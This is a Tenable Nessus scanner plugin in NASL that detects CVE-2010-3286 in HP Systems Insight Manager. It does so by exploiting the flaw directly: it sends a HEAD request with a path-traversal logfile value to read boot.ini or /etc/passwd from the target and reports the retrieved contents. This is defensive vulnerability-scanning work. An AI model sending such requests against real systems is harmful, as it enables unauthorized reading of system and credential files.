#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(50349);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2015/10/07 15:36:47 $");

  script_cve_id("CVE-2010-3286");
  script_bugtraq_id(44098);
  script_osvdb_id(68649);
  script_xref(name:"TRA", value:"TRA-2010-03");

  script_name(english:"HP Systems Insight Manager logfile Parameter Arbitrary File Download");
  script_summary(english:"Tries to retrieve the contents of a file");

  script_set_attribute(attribute:"synopsis", value:
"The remote Windows host contains software that is affected by an
arbitrary file download vulnerability.");

  script_set_attribute(attribute:"description", value:
"HP Systems Insight Manager is affected by an arbitrary file download
vulnerability that can be leveraged by a remote attacker to download
files of their choosing. 

If an attacker supplies a specially crafted HEAD request to the
'logfile' variable in 'switchFWInstallStatus.jsp', an arbitrary file
can be read with SYSTEM or root privileges.");
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2010-03");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ec3e7264");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?920a97e4");
  script_set_attribute(attribute:"solution", value:"Install HP Systems Insight Manager 6.0 / 6.1 September 2010 Hotfix or later, or upgrade to 6.2.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value: "2010/10/13");
  script_set_attribute(attribute:"patch_publication_date",value:"2010/10/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/10/26");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:systems_insight_manager");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www",50000);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

report="";
report_file="";

os = get_kb_item("Host/OS");
if(os)
{
  if ("Windows" >< os)
  {
    file = "..\..\..\..\..\boot.ini";
    report_file = "boot.ini";
  }

  else 
  {
    file = "/etc/passwd";
    report_file = "/etc/passwd";
  }

  files = make_list(file);

}
else files = make_list("..\..\..\..\..\boot.ini", "/etc/passwd");

file_pats = make_array();

file_pats["..\..\..\..\..\boot.ini"] = "\[boot loader\]";
file_pats["/etc/passwd"] = "root:.*:0:[01]:";


port = get_http_port(default:50000);

res = http_get_cache(item:'/', port:port, exit_on_fail: 1);

if ("HP Systems Insight Manager" >< res)
{
  foreach file(files)
  {
    soc = http_open_socket(port);
    if (!soc) exit(1, "Failed to open a socket on port "+port+".");

    req="HEAD /mxportal/taskandjob/switchFWInstallStatus.jsp?logfile="+file+'\r\n\r\n';

    send(socket:soc, data:req);
    res = http_recv3(socket:soc);

    http_close_socket(soc);

    if (isnull(res)) exit(1, "Tthe web server on port "+port+" failed to respond."); 

    file_pat = file_pats[file];
    if (!report_file)
    {
        
      if(file_pat == "\[boot loader\]") report_file = "boot.ini";
      if(file_pat == "root:.*:0:[01]:") report_file = "/etc/passwd";
        
    }

    if (res[2] && egrep(pattern:file_pat, string:res[2]))
    {
        
      if (report_file == "boot.ini")
      {
        begin = strstr(res[2], "[boot loader]");
        end = strstr(begin, "</textarea>");
          
        res[2] = begin - end;
      }
      if (report_file == "/etc/passwd")
      {
        begin = strstr(res[2], "root:");
        end = strstr(begin, "</textarea>");
          
        res[2] = begin - end;
      }

      if (report_verbosity > 0)
      {
        report = '\n' +
          'Nessus was able to exploit the issue to retrieve the contents of\n' +
          "'" + report_file + "' on the remote host using the following request :" + '\n' +
          '\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
          req +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
        if (report_verbosity > 1)
          report += '\n' +
            'Here are its contents :\n' +
            '\n' +
            crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
            res[2] +
            crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
    }
    else exit(0, "HP Systems Insight Manager doesn't seem to be vulnerable.");
  }
}
else exit(0, "HP Systems Insight Manager was not detected on port "+port+".");
